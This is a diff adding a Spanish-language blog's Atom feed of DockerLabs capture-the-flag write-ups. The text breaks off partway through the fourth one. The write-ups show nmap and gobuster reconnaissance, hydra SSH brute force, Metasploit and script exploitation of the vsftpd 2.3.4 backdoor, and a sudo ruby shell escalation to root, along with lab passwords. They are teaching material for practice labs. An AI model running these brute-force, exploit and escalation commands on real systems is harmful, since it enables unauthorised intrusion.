@@ -1,0 +1,1936 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2025-11-07T23:39:59+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Ciberseguridad</title><subtitle>He&apos;s writing in Bahasa about web technology and experience as a journal  for documentation things that he learned, meet him &lt;a href=&quot;https://github.com/piharpi&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;@github&lt;/a&gt;.</subtitle><author><name>Mauricio López</name><email>your-email@email.com</email></author><entry><title type="html">Maquina Vacaciones</title><link href="http://localhost:4000/maquina-Vacaciones/" rel="alternate" type="text/html" title="Maquina Vacaciones" /><published>2025-07-22T16:00:00+00:00</published><updated>2025-07-22T16:00:00+00:00</updated><id>http://localhost:4000/maquina-Vacaciones</id><content type="html" xml:base="http://localhost:4000/maquina-Vacaciones/"><![CDATA[<p>En esta práctica resolveremos una máquina de <strong>DockerLabs</strong> donde identificaremos un <strong>error común en el desarrollo de aplicaciones web</strong>: la inclusión de <strong>comentarios sensibles en el código</strong>. Estos comentarios pueden contener información crítica como <strong>usuarios y contraseñas</strong>, lo que representa una vulnerabilidad grave y fácilmente explotable para comprometer la maquina.</p>
+
+<p><img src="image.png" alt="alt text" /></p>
+
+<p>Empezaremos haciendo un escaneo de puertos a la maquina <strong>Vacaciones</strong> con la herramienta <strong>Nmap</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> sudo nmap -p- --open -sSCV --min-rate 5000 -Pn -n -v 172.17.0.2 -oN escaneo
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">sudo</code></td>
+      <td>Se necesita privilegios de administrador para algunos tipos de escaneo (como los de tipo SYN).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">nmap</code></td>
+      <td>Herramienta para escaneo de redes y puertos.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-p-</code></td>
+      <td>Escanea <strong>todos los puertos</strong> (del 1 al 65535).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--open</code></td>
+      <td>Muestra <strong>solo los puertos abiertos</strong>, omite los cerrados y filtrados.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-sSCV</code></td>
+      <td>Combinación de opciones:  <br />• <code class="language-plaintext highlighter-rouge">-sS</code> = Escaneo <strong>SYN</strong> (rápido y sigiloso).  <br />• <code class="language-plaintext highlighter-rouge">-sC</code> = Usa <strong>scripts NSE básicos</strong>, equivalente a <code class="language-plaintext highlighter-rouge">--script=default</code>.  <br />• <code class="language-plaintext highlighter-rouge">-sV</code> = Detecta versiones de servicios.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--min-rate 5000</code></td>
+      <td>Intenta enviar <strong>al menos 5000 paquetes por segundo</strong> (muy rápido). ⚠️ Puede generar falsos positivos si la red no lo soporta bien.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-Pn</code></td>
+      <td>No hace <strong>ping previo</strong> al host (asume que está vivo). Útil si ICMP está bloqueado.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-n</code></td>
+      <td>No resuelve nombres DNS (más rápido).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-v</code></td>
+      <td>Modo <strong>verborreico</strong>: muestra más detalles durante el escaneo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">172.17.0.2</code></td>
+      <td>IP del objetivo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-oN escaneo</code></td>
+      <td>Guarda el resultado en un archivo llamado <code class="language-plaintext highlighter-rouge">escaneo</code> en formato <strong>legible para humanos</strong> (normal output).</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>El escaneo nos muestra que esta maquina tiene 2 puerto abierto.</p>
+
+<ul>
+  <li>puerto 22 ssh version 7.6</li>
+  <li>puerto 80 http</li>
+</ul>
+
+<p><img src="image-1.png" alt="alt text" /></p>
+
+<p>Revisaremos que servicio http esta corriendo por el puerto 80. Es una pagina en blanco, pero al revisar el código fuente se puede ver un comentario.</p>
+
+<p><img src="image-2.png" alt="alt text" /></p>
+
+<p>Podrían ser 2 posibles usuarios <strong>Juan</strong> y <strong>Camilo</strong></p>
+
+<p><img src="image-3.png" alt="alt text" /></p>
+
+<p>Usare la herramienta <strong>gobuster</strong> para hacer un fuzzing en la pagina y ver si este tiene directorios ocultos. Usare el siguiente comando:</p>
+
+<p><code class="language-plaintext highlighter-rouge">gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,sh</code></p>
+
+<p>No se encontró mucho aparte de la clásica <strong>server-status</strong> se encontró otro directorio llamado <strong>javascript</strong> con el código de estado <strong>301</strong> que en pocas palabras quiere decir que el contenido de ese directorio fue movido.</p>
+
+<p><img src="image-4.png" alt="alt text" /></p>
+
+<p>Vamos a usar la herramienta <strong>hydra</strong> para ver si estos 2 usuarios que encontramos tienen credenciales. Para ello usaremos el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+</code></pre></div></div>
+
+<p>Al probar con el primer usuario <strong>juan</strong> no encontró nada después de dejarlo un buen tiempo escaneando… Pero con el otro usuario <strong>camilo</strong> si encontró credenciales.</p>
+
+<ul>
+  <li><strong>user: camilo</strong></li>
+  <li><strong>password: password1</strong></li>
+</ul>
+
+<p><img src="image-5.png" alt="alt text" /></p>
+
+<p>Probaremos estas credenciales en el puerto 22 ssh ya que esta abierto. Pudimos tener acceso.</p>
+
+<p><img src="image-6.png" alt="alt text" /></p>
+
+<p>Probamos el comando <code class="language-plaintext highlighter-rouge">sudo -l</code> para ver si tenemos acceso a binarios vulnerables, pero nos pide una password, al usar el mismo password de camilo  <strong>“password1”</strong> no nos funciona</p>
+
+<p><img src="image-7.png" alt="alt text" /></p>
+
+<p>Luego de estar un rato buscando, encontramos un archivo llamado <strong>correo.txt</strong> en el directorio <strong>mail</strong> y tiene sentido ya que el primer mensaje que encontramos nos decía de que juan nos había dejado un correo.</p>
+
+<p><img src="image-8.png" alt="alt text" /></p>
+
+<p>También existe una forma mas rápida para hacer búsquedas de archivos con el comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -type f -name "*.txt"
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find</code></td>
+      <td>Comando para <strong>buscar archivos o directorios</strong> en el sistema.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/</code></td>
+      <td>El directorio <strong>donde comienza la búsqueda</strong> (en este caso, desde la raíz).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-type f</code></td>
+      <td>Busca solo <strong>archivos</strong> (no carpetas).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-name "*.txt"</code></td>
+      <td>Filtra por nombre: solo los que <strong>terminan en <code class="language-plaintext highlighter-rouge">.txt</code></strong>.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="image-9.png" alt="alt text" /></p>
+
+<p>Al abrir el archivo, nos deja unas credenciales.</p>
+
+<ul>
+  <li><strong>2k84dicb</strong></li>
+</ul>
+
+<p><img src="image-10.png" alt="alt text" /></p>
+
+<p>Al tener estas credenciales nuevas, podríamos intentar entrar por ssh con el usuario <strong>juan</strong>. Tenemos exito.</p>
+
+<p><img src="image-11.png" alt="alt text" /></p>
+
+<p>Al aplicar un <code class="language-plaintext highlighter-rouge">sudo -l</code> nos dice que podemos obtener privilegios elevados con ruby.</p>
+
+<p><img src="image-12.png" alt="alt text" /></p>
+
+<p>Consultamos la pagina https://gtfobins.github.io/gtfobins/ruby/#sudo para ver como poder hacerlo. Nos dice que solo tenemos que ejecutar ese comando.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo ruby -e 'exec "/bin/sh"'
+</code></pre></div></div>
+
+<p><img src="image-13.png" alt="alt text" /></p>
+
+<p>Ya con esto logramos ser <strong>root</strong></p>
+
+<p><img src="image-14.png" alt="alt text" /></p>]]></content><author><name>Mauricio López</name><email>your-email@email.com</email></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[En esta práctica resolveremos una máquina de DockerLabs donde identificaremos un error común en el desarrollo de aplicaciones web: la inclusión de comentarios sensibles en el código. Estos comentarios pueden contener información crítica como usuarios y contraseñas, lo que representa una vulnerabilidad grave y fácilmente explotable para comprometer la maquina.]]></summary></entry><entry><title type="html">Maquina Tproot</title><link href="http://localhost:4000/maquina-tproot/" rel="alternate" type="text/html" title="Maquina Tproot" /><published>2025-06-08T16:00:00+00:00</published><updated>2025-06-08T16:00:00+00:00</updated><id>http://localhost:4000/maquina-tproot</id><content type="html" xml:base="http://localhost:4000/maquina-tproot/"><![CDATA[<p>En esta práctica resolveremos una máquina de DockerLabs en la que analizaremos la vulnerabilidad <em>CVE-2011-2523</em>, un <em>backdoor</em> que aprovecharemos utilizando la herramienta <em>Metasploit</em> para explotarla y tomar control de la máquina víctima.</p>
+
+<p><img src="image.png" alt="alt text" /></p>
+
+<p>Empezaremos haciendo un escaneo de puertos a la maquina <strong>Tproot</strong> con la herramienta <strong>Nmap</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> sudo nmap -p- --open -sSCV --min-rate 5000 -Pn -n -v 172.17.0.2 -oN escaneo
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">sudo</code></td>
+      <td>Se necesita privilegios de administrador para algunos tipos de escaneo (como los de tipo SYN).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">nmap</code></td>
+      <td>Herramienta para escaneo de redes y puertos.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-p-</code></td>
+      <td>Escanea <strong>todos los puertos</strong> (del 1 al 65535).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--open</code></td>
+      <td>Muestra <strong>solo los puertos abiertos</strong>, omite los cerrados y filtrados.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-sSCV</code></td>
+      <td>Combinación de opciones:  <br />• <code class="language-plaintext highlighter-rouge">-sS</code> = Escaneo <strong>SYN</strong> (rápido y sigiloso).  <br />• <code class="language-plaintext highlighter-rouge">-sC</code> = Usa <strong>scripts NSE básicos</strong>, equivalente a <code class="language-plaintext highlighter-rouge">--script=default</code>.  <br />• <code class="language-plaintext highlighter-rouge">-sV</code> = Detecta versiones de servicios.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--min-rate 5000</code></td>
+      <td>Intenta enviar <strong>al menos 5000 paquetes por segundo</strong> (muy rápido). ⚠️ Puede generar falsos positivos si la red no lo soporta bien.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-Pn</code></td>
+      <td>No hace <strong>ping previo</strong> al host (asume que está vivo). Útil si ICMP está bloqueado.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-n</code></td>
+      <td>No resuelve nombres DNS (más rápido).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-v</code></td>
+      <td>Modo <strong>verborreico</strong>: muestra más detalles durante el escaneo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">172.17.0.2</code></td>
+      <td>IP del objetivo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-oN escaneo</code></td>
+      <td>Guarda el resultado en un archivo llamado <code class="language-plaintext highlighter-rouge">escaneo</code> en formato <strong>legible para humanos</strong> (normal output).</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>El escaneo nos muestra que esta maquina tiene 2 puerto abierto.</p>
+
+<ul>
+  <li>puerto 21 FTP versión  vsftpd 2.3.4 con una vulnerabilidad perteneciente al <strong>CVE - 2011-2523</strong></li>
+  <li>puerto 80 http</li>
+</ul>
+
+<p><img src="image-1.png" alt="alt text" /></p>
+
+<p>Revisaremos el puerto 80 para ver que esta corriendo. Es una pagina de apache.</p>
+
+<p><img src="image-2.png" alt="alt text" /></p>
+
+<p>Usaremos la herramienta <strong>gobuster</strong> para ver si esta pagina contiene directorios ocultos. Para ello usaremos el siguiente comando:</p>
+
+<p><code class="language-plaintext highlighter-rouge">gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,sh</code></p>
+
+<p>No encontró nada.</p>
+
+<p><img src="image-3.png" alt="alt text" /></p>
+
+<p>Entonces trabajaremos con el puerto 21 aprovechando su vulnerabilidad <strong>CVE - 2011-2523</strong> de un ataque de <strong>backdoor</strong>. Para ello usaremos la herramienta <strong>metasploit</strong></p>
+
+<h2 id="que-es-metasploit">Que es metasploit?</h2>
+
+<p><strong>Metasploit Framework</strong> es una <strong>plataforma de explotación</strong> que permite:</p>
+
+<p>✅ Buscar vulnerabilidades<br />
+✅ Desarrollar y lanzar exploits<br />
+✅ Crear cargas maliciosas (payloads)<br />
+✅ Obtener acceso remoto (shells)<br />
+✅ Post-explotación (escalar privilegios, etc.)</p>
+
+<h2 id="para-qué-se-usa">¿Para qué se usa?</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Función</th>
+      <th>Descripción breve</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>🔍 Escaneo y reconocimiento</td>
+      <td>Buscar información del sistema objetivo</td>
+    </tr>
+    <tr>
+      <td>🎯 Explotación</td>
+      <td>Usar vulnerabilidades conocidas para obtener acceso</td>
+    </tr>
+    <tr>
+      <td>📦 Payloads</td>
+      <td>Cargas útiles para ganar control: shells, meterpreter, etc.</td>
+    </tr>
+    <tr>
+      <td>📡 Módulos auxiliares</td>
+      <td>Ataques sin explotación: fuerza bruta, escaneo SMB, sniffers…</td>
+    </tr>
+    <tr>
+      <td>🧽 Limpieza</td>
+      <td>Borrar rastros, mantener acceso, etc.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Dicho esto usamos el siguiente comando para abrir metasploit <code class="language-plaintext highlighter-rouge">msfconsole</code>. Luego escribimos el siguiente comando: <code class="language-plaintext highlighter-rouge">search vsftpd 2.3.4</code> lo cual nos buscara un exploit que sea para explotar esta vulnerabilidad. En este caso nos encontró un exploit para realizar un <strong>backdoor</strong>.</p>
+
+<p><img src="image-4.png" alt="alt text" /></p>
+
+<p>Escribimos el siguiente comando <code class="language-plaintext highlighter-rouge">use 0</code> para poder hacer uso del exploit. Luego se nos cargara el exploit para poder empezar a configurar el <strong>payload</strong> para ello ponemos el comando <code class="language-plaintext highlighter-rouge">options</code> para que nos muestre que tenemos que configurar para hacer funcionar el exploit. En este caso solo nos pide configurar el <strong>RHOSTS</strong> para poder hacerlo funcionar.</p>
+
+<p><img src="image-5.png" alt="alt text" /></p>
+
+<p>Para configurar el RHOSTS pondremos el siguiente comando: <code class="language-plaintext highlighter-rouge">set rhosts 172.17.0.2</code> con esto tendremos listo la configuración del exploit.</p>
+
+<p><img src="image-6.png" alt="alt text" /></p>
+
+<p>Para hacerlo correr solo debemos poner el comando <strong>exploit</strong> y esperar a que termine de cargar el exploit. Una vez terminado veremos que ya somos <strong>root</strong> dentro de la maquina victima.</p>
+
+<p><img src="image-7.png" alt="alt text" /></p>
+
+<p>CTF?? jaja</p>
+
+<p><img src="image-8.png" alt="alt text" /></p>]]></content><author><name>Mauricio López</name><email>your-email@email.com</email></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[En esta práctica resolveremos una máquina de DockerLabs en la que analizaremos la vulnerabilidad CVE-2011-2523, un backdoor que aprovecharemos utilizando la herramienta Metasploit para explotarla y tomar control de la máquina víctima.]]></summary></entry><entry><title type="html">Maquina FirstHacking</title><link href="http://localhost:4000/maquina-FirstHacking/" rel="alternate" type="text/html" title="Maquina FirstHacking" /><published>2025-05-22T16:00:00+00:00</published><updated>2025-05-22T16:00:00+00:00</updated><id>http://localhost:4000/maquina-FirstHacking</id><content type="html" xml:base="http://localhost:4000/maquina-FirstHacking/"><![CDATA[<p>En este laboratorio exploraremos una máquina de DockerLabs con una vulnerabilidad en el puerto 21. Aprovecharemos esta falla para introducir un <strong><em>backdoor</em></strong> y obtener acceso privilegiado como <em>root</em>, empleando una herramienta extraída de un repositorio en GitHub.</p>
+
+<p><img src="image.png" alt="alt text" /></p>
+
+<p>Empezaremos haciendo un escaneo de puertos a la maquina <strong>FirstHacking</strong> con la herramienta <strong>Nmap</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> sudo nmap -p- --open -sSCV --min-rate 5000 -Pn -n -v 172.17.0.2 -oN escaneo
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">sudo</code></td>
+      <td>Se necesita privilegios de administrador para algunos tipos de escaneo (como los de tipo SYN).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">nmap</code></td>
+      <td>Herramienta para escaneo de redes y puertos.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-p-</code></td>
+      <td>Escanea <strong>todos los puertos</strong> (del 1 al 65535).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--open</code></td>
+      <td>Muestra <strong>solo los puertos abiertos</strong>, omite los cerrados y filtrados.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-sSCV</code></td>
+      <td>Combinación de opciones:  <br />• <code class="language-plaintext highlighter-rouge">-sS</code> = Escaneo <strong>SYN</strong> (rápido y sigiloso).  <br />• <code class="language-plaintext highlighter-rouge">-sC</code> = Usa <strong>scripts NSE básicos</strong>, equivalente a <code class="language-plaintext highlighter-rouge">--script=default</code>.  <br />• <code class="language-plaintext highlighter-rouge">-sV</code> = Detecta versiones de servicios.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--min-rate 5000</code></td>
+      <td>Intenta enviar <strong>al menos 5000 paquetes por segundo</strong> (muy rápido). ⚠️ Puede generar falsos positivos si la red no lo soporta bien.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-Pn</code></td>
+      <td>No hace <strong>ping previo</strong> al host (asume que está vivo). Útil si ICMP está bloqueado.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-n</code></td>
+      <td>No resuelve nombres DNS (más rápido).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-v</code></td>
+      <td>Modo <strong>verborreico</strong>: muestra más detalles durante el escaneo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">172.17.0.2</code></td>
+      <td>IP del objetivo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-oN escaneo</code></td>
+      <td>Guarda el resultado en un archivo llamado <code class="language-plaintext highlighter-rouge">escaneo</code> en formato <strong>legible para humanos</strong> (normal output).</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>El escaneo nos muestra que esta maquina tiene 1 puerto abierto.</p>
+
+<ul>
+  <li>puerto 21 FTP <strong>vsftpd 2.3.4</strong></li>
+</ul>
+
+<p><img src="image-1.png" alt="alt text" /></p>
+
+<p>El puerto FTP 21 es el puerto estándar de control y comando para el Protocolo de Transferencia de Archivos (FTP). Se utiliza para establecer la conexión entre un cliente FTP y un servidor FTP. El puerto 20, por otro lado, se utiliza para la transferencia de datos. </p>
+
+<p>El Puerto 21 en detalle:</p>
+
+<p><strong>Función:</strong></p>
+
+<p>El puerto 21 es el puerto de control y comando para FTP, a través del cual el cliente envía comandos al servidor y el servidor responde. </p>
+
+<p><strong>Conexión:</strong></p>
+
+<p>Para conectarse a un servidor FTP, el cliente debe establecer una conexión de control en el puerto 21. </p>
+
+<p><strong>Transferencia de datos:</strong></p>
+
+<p>Después de establecer la conexión de control en el puerto 21, se utiliza el puerto 20 para la transferencia de datos entre el cliente y el servidor.</p>
+
+<p>Dicho esto al tener el puerto 21 una versión 2.3.4 se puede hacer un <strong>backdoor</strong>. Esta vulnerabilidad es la  <strong>CVE-2011-2523</strong></p>
+
+<h2 id="que-es-un-backdoor">Que es un backdoor?</h2>
+
+<p>Un <strong>backdoor</strong> es una forma de obtener acceso oculto o no autorizado a un sistema, <em>saltándose la autenticación o los controles normales</em>. Puede ser:</p>
+
+<p>🛠️ Instalado por un atacante.</p>
+
+<p>👨‍💻 Dejado intencionalmente por un desarrollador.</p>
+
+<p>🧬 Inyectado mediante una vulnerabilidad.</p>
+
+<p>Descargaremos este repositorio de github donde contiene el exploit para vulnerar el sistema.</p>
+
+<p><img src="image-2.png" alt="alt text" /></p>
+
+<p>Uno de los requerimientos para usar este exploit es instalar <strong>pwntools</strong>. Pwntools es una librería de Python muy usada para escribir exploits. El problema es que se instala con pip lo cual esto kali linux no deja hacerlo.</p>
+
+<p><img src="image-3.png" alt="alt text" /></p>
+
+<p>Recomiendo crear un entorno virtual con Python para instalar la librería</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m venv ~/venvs/pwnenv
+</code></pre></div></div>
+
+<p>con este comando activas el entorno virtual. Una vez activado puedes empezar a instalar la librería <strong>pwntools</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>source ~/venvs/pwnenv/bin/activate
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install pwntools
+</code></pre></div></div>
+
+<p>Ya descargado el archivo lo ejecutamos con el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py 172.17.0.2 21
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte del comando</th>
+      <th>Explicación</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">python3</code></td>
+      <td>Ejecuta el script usando Python 3.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">exploit.py</code></td>
+      <td>Es el script que estás ejecutando. Contiene el código del exploit.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">172.17.0.2</code></td>
+      <td>Es la <strong>dirección IP</strong> de la víctima (una máquina o contenedor con FTP).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">21</code></td>
+      <td>Es el <strong>puerto objetivo</strong>, en este caso el puerto del servicio FTP.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ya ejecutado veremos que somos <strong>root</strong> en la maquina victima.</p>
+
+<p><img src="image-4.png" alt="alt text" /></p>
+
+<p>PD: para desactivar el entorno virtual de Python usar este comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>deactivate
+</code></pre></div></div>]]></content><author><name>Mauricio López</name><email>your-email@email.com</email></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[En este laboratorio exploraremos una máquina de DockerLabs con una vulnerabilidad en el puerto 21. Aprovecharemos esta falla para introducir un backdoor y obtener acceso privilegiado como root, empleando una herramienta extraída de un repositorio en GitHub.]]></summary></entry><entry><title type="html">Maquina Hedgehog</title><link href="http://localhost:4000/maquina-Hedgehog/" rel="alternate" type="text/html" title="Maquina Hedgehog" /><published>2025-05-22T16:00:00+00:00</published><updated>2025-05-22T16:00:00+00:00</updated><id>http://localhost:4000/maquina-Hedgehog</id><content type="html" xml:base="http://localhost:4000/maquina-Hedgehog/"><![CDATA[<p>En esta práctica resolveremos una máquina de <strong>DockerLabs</strong> enfocada en la explotación del servicio <strong>SSH (puerto 22)</strong> mediante un ataque de <strong>fuerza bruta</strong>. A lo largo del proceso iremos encontrando distintas <strong>pistas</strong> que nos guiarán hacia la solución, incluyendo la necesidad de <strong>invertir y formatear un diccionario</strong> para utilizarlo de forma efectiva y así lograr vulnerar la máquina.</p>
+
+<p><img src="image.png" alt="alt text" /></p>
+
+<p>Empezaremos haciendo un escaneo de puertos a la maquina <strong>Hedgehog</strong> con la herramienta <strong>Nmap</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> sudo nmap -p- --open -sSCV --min-rate 5000 -Pn -n -v 172.17.0.2 -oN escaneo
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">sudo</code></td>
+      <td>Se necesita privilegios de administrador para algunos tipos de escaneo (como los de tipo SYN).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">nmap</code></td>
+      <td>Herramienta para escaneo de redes y puertos.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-p-</code></td>
+      <td>Escanea <strong>todos los puertos</strong> (del 1 al 65535).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--open</code></td>
+      <td>Muestra <strong>solo los puertos abiertos</strong>, omite los cerrados y filtrados.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-sSCV</code></td>
+      <td>Combinación de opciones:  <br />• <code class="language-plaintext highlighter-rouge">-sS</code> = Escaneo <strong>SYN</strong> (rápido y sigiloso).  <br />• <code class="language-plaintext highlighter-rouge">-sC</code> = Usa <strong>scripts NSE básicos</strong>, equivalente a <code class="language-plaintext highlighter-rouge">--script=default</code>.  <br />• <code class="language-plaintext highlighter-rouge">-sV</code> = Detecta versiones de servicios.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--min-rate 5000</code></td>
+      <td>Intenta enviar <strong>al menos 5000 paquetes por segundo</strong> (muy rápido). ⚠️ Puede generar falsos positivos si la red no lo soporta bien.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-Pn</code></td>
+      <td>No hace <strong>ping previo</strong> al host (asume que está vivo). Útil si ICMP está bloqueado.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-n</code></td>
+      <td>No resuelve nombres DNS (más rápido).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-v</code></td>
+      <td>Modo <strong>verborreico</strong>: muestra más detalles durante el escaneo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">172.17.0.2</code></td>
+      <td>IP del objetivo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-oN escaneo</code></td>
+      <td>Guarda el resultado en un archivo llamado <code class="language-plaintext highlighter-rouge">escaneo</code> en formato <strong>legible para humanos</strong> (normal output).</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>El escaneo nos muestra que esta maquina tiene 2 puerto abierto.</p>
+
+<ul>
+  <li>puerto 22 ssh version 9.6</li>
+  <li>puerto 80 http</li>
+</ul>
+
+<p><img src="image-1.png" alt="alt text" /></p>
+
+<p>Revisaremos que esta corriendo por el puerto 80. una pagina el mensaje <strong>tails</strong> cola(s) en ingles. También revise el código fuente de la pagina pero no se encontró nada raro</p>
+
+<p><img src="image-2.png" alt="alt text" /></p>
+
+<p>Realizare un fuzzing con la herramienta gobuster para ver si la pagina esconde directorios ocultos y le especificaremos que busque archivos <strong>.php, .txt y .sh.</strong> Para ello usaremos el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,sh`
+</code></pre></div></div>
+
+<p>Lamentablemente no se encontró nada. Anteriormente habíamos encontrado la frase <strong>tails</strong> podría ser el nombre de algún usuario, ademas de tener el puerto 22 ssh abierto por lo cual podríamos intentar hacer fuerza bruta con hydra y ver si existe alguna password para ese usuario</p>
+
+<p><img src="image-3.png" alt="alt text" /></p>
+
+<p>Usaremos la herramienta <strong>hydra</strong> para hacer fuerza bruta. Para eso usaremos el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+</code></pre></div></div>
+
